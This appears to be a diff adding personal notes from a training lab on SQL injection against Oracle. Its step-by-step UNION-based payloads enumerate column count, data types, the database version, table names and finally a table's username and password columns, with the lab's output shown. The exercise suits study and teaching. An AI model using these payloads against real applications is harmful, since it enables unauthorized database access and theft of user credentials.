@@ -1,0 +1,36 @@
+Lab: SQL injection attack, listing the database contents on Oracle
+
+Goals
+ - Determine the table that contains usernames and passwords
+ - Determin the relevant columns
+ - Login as the admin user
+
+Analysis:
+ ----------
+ 1. Find the number of columns
+    ' order by 2-- >> 200
+    ' order by 3-- >> 500
+    Using 2 columns
+ On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
+
+There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual 
+2. Find the data type of the columns
+    ' union select 'a', 'a' from all_tables-- >> 200
+    ' union select 'a', 'a' from dual-- >> 200
+    Both columns accept strings
+
+3. Determine version of database
+    ' union select null, banner from v$version--
+    CORE	11.2.0.2.0	Production
+    NLSRTL Version 11.2.0.2.0 - Production
+    Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+    PL/SQL Release 11.2.0.2.0 - Production
+    TNS for Linux: Version 11.2.0.2.0 - Production
+
+4. Output list of table names in the database
+    ' union select owner, table_name from all_tables--
+    Found >> USERS_COOTLL
+
+5. Output column names from the selected table
+    ' union select column_name, null from all_tab_columns where table_name='USERS_COOTLL'--
+    Found >> USERNAME_STRAHH, PASSWORD_ZOOHUI
